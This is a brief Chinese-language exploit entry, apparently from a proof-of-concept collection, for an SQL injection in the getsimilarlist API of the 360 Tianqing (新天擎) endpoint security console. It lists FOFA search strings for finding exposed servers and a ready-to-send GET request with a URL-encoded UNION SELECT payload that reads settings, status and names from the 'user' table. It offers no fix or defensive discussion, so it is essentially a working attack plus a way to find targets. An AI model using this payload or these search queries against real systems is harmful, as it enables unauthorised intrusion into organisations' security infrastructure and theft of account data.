
## 奇安信360天擎getsimilarlistSQL注入漏洞

## fofa
```
body="/task/index/detail?id={item.id}"
title="360新天擎"
```

## POC
```
GET /api/client/getsimilarlist?status[0,1%29+union+all+select+%28%2F%2A%2150000select%2A%2F+79787337%29%2C+setting%2C+setting%2C+status%2C+name%2C+create_time+from+%22user%22+where+1+in+%281]=1&status[0]=1 HTTP/1.1
```
